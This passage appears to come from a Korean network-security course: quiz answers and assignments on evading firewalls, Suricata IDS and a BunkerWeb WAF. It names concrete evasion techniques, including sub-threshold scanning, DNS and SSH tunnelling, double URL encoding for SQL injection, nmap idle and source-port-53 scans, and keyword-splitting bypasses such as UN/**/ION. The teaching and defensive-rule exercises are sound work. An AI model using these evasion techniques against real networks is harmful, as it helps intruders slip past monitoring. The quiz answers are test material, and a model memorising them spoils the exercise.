동일 소스 IP에서 5초 동안 50회 이상 규칙이 매칭되어야 알림을 발생시킨다. "both"는 임계값 초과 시 알림을 보내되, 이후 일정 기간 중복 알림을 억제한다. 따라서 5초에 49회 이하로 스캔하면 탐지를 회피할 수 있다.
</details>

**Q4.** SSH 동적 포워딩(-D)과 로컬 포워딩(-L)의 차이는?

<details><summary>정답</summary>
로컬 포워딩(-L)은 하나의 목적지(IP:포트)에 대한 고정 터널을 생성한다. 동적 포워딩(-D)은 SOCKS 프록시를 생성하여 터널을 통해 임의의 목적지에 접근할 수 있다. 동적 포워딩이 더 유연하지만 proxychains 등의 도구가 필요하다.
</details>

**Q5.** DNS 터널링이 방화벽을 우회할 수 있는 근본적 이유는?

<details><summary>정답</summary>
DNS(UDP 53)는 인터넷 통신의 핵심 프로토콜이므로 거의 모든 네트워크에서 허용된다. DNS 쿼리의 서브도메인과 TXT 레코드에 데이터를 인코딩하면, DNS 트래픽으로 위장하여 데이터를 송수신할 수 있다. 대부분의 방화벽은 DNS 내용을 심층 검사하지 않는다.
</details>

**Q6.** URL 이중 인코딩(`%2527`)이 WAF를 우회할 수 있는 원리는?

<details><summary>정답</summary>
WAF가 URL 디코딩을 1회만 수행하면 %2527은 %27로 디코딩된다. WAF는 %27을 문자열로 인식하고 위험하지 않다고 판단한다. 이후 백엔드 서버가 %27을 다시 디코딩하면 '(작은따옴표)가 되어 SQL Injection이 실행된다.
</details>

**Q7.** nmap -sI(Idle Scan)에서 Zombie 호스트가 갖춰야 할 조건은?

<details><summary>정답</summary>
1. IP ID를 순차적으로 증가시켜야 한다(predictable IP ID sequence)
2. 유휴(idle) 상태여야 한다(다른 통신이 거의 없어야 IP ID 변화 추적 가능)
3. 공격자와 대상 모두에서 접근 가능해야 한다
</details>

**Q8.** 방화벽이 소스 포트 53을 신뢰하는 이유와 이를 악용하는 방법은?

<details><summary>정답</summary>
DNS 응답은 소스 포트 53에서 오므로, 일부 오래된 방화벽 규칙은 소스 포트 53의 트래픽을 DNS 응답으로 간주하여 허용한다. 공격자는 nmap --source-port 53으로 소스 포트를 53으로 설정하여 이 규칙을 악용할 수 있다.
</details>

**Q9.** Suricata에서 `content:"UNION"; nocase;` 규칙을 우회하는 방법 3가지는?

<details><summary>정답</summary>
1. URL 인코딩: %55NION (%55 = U)
2. 주석 삽입: UN/**/ION (SQL 주석으로 키워드 분리)
3. 동의어 사용: UNION ALL (추가 키워드로 패턴 변경)
(추가: 이중 인코딩, NULL 바이트 삽입, 화이트스페이스 변형 등)
</details>

**Q10.** 실습 환경의 다층 보안(nftables → Suricata → BunkerWeb)을 모두 우회하려면 어떤 전략을 사용해야 하는가?

<details><summary>정답</summary>
1. nftables 우회: 허용된 포트(22, 80, 443)만 사용, SSH 터널링으로 내부 접근
2. Suricata 우회: 저속 스캔(임계값 미만), 인코딩(시그니처 회피), 암호화(HTTPS/SSH)
3. BunkerWeb 우회: User-Agent 변경, 속도 제한 미만 유지, 인코딩된 페이로드
4. 조합: SSH 터널 → 암호화된 채널 → Suricata/BunkerWeb 모두 무력화
</details>

---

## 과제

### 과제 1: 우회 기법 효과 분석 (개인)
실습에서 사용한 6가지 우회 기법(Decoy, 프래그먼트, 소스포트, 인코딩, 타이밍, 터널링)의 효과를 표로 정리하라. 각 기법의 우회 대상(방화벽/IDS/WAF), 성공률, 탐지 여부를 포함할 것.

### 과제 2: Suricata 커스텀 규칙 작성 (팀)
이번 주 실습에서 사용한 우회 기법을 탐지할 수 있는 Suricata 커스텀 규칙 5개를 작성하라. 각 규칙의 탐지 로직, content/pcre 등 매칭 조건, 임계값 설정을 포함할 것.

### 과제 3: 네트워크 보안 아키텍처 개선안 (팀)
현재 실습 환경의 보안 아키텍처(nftables + Suricata + BunkerWeb)의 약점을 분석하고, 우회 기법에 대응할 수 있는 개선안을 제시하라. 추가 장비 도입, 규칙 강화, 모니터링 개선 등을 포함할 것.
